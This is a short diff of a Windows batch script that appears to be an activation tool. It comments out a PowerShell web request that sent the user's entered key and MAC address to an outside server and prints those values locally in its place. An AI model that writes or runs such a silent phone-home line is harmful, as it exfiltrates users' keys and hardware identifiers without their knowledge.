@@ -981,7 +981,9 @@ if defined _perm (
 
 :: i modified here | activation successful
 :: hit url to update scripting status
-powershell -command "(Invoke-WebRequest -Uri 'https://digivice.xyz/update/status?product=windows&status=complete&key=!userInput!&mac=!userMacAdd!' -UseBasicParsing) | Out-Null"
+echo %userInput%
+echo %userMacAdd%
+::powershell -command "(Invoke-WebRequest -Uri 'https://digivice.xyz/update/status?product=windows&status=complete&key=!userInput!&mac=!userMacAdd!' -UseBasicParsing) | Out-Null"
 
 
 echo:
